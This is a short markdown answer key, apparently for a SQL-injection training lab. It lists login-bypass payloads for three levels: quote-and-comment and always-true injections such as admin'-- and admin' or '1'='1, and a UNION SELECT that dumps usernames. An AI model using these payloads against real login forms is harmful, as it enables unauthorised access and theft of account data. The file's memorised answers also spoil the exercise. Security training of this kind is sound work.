# Solutions

**Level1**: Login as admin
- username: `admin'-- `, `admin'#`, `admin' or '1'='1`
- password: `whatever`

**Level2**: Login as admin (double quotes)
- username: `admin"--`, `admin"#`, `admin" or "1"="1`
- password: `whatever`

**Level3**: Login as admin (use UNION to control the returned result)
- username: `" UNION SELECT GROUP_CONCAT(username) FROM users -- ` 
- password: `whatever`
